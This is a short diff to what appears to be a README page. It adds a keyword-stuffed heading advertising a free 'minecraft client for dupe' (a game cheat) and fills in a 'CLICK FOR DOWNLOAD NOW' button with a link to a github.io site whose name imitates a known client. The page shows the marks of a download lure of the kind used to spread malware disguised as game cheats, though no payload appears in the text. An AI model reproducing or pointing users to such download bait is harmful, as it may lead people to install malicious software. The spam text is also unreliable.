@@ -1,10 +1,10 @@
-
+# download minecraft client for dupe for Windows | free system requirements minecraft client for dupe. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://liquidbounce-javascrip-zm90.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
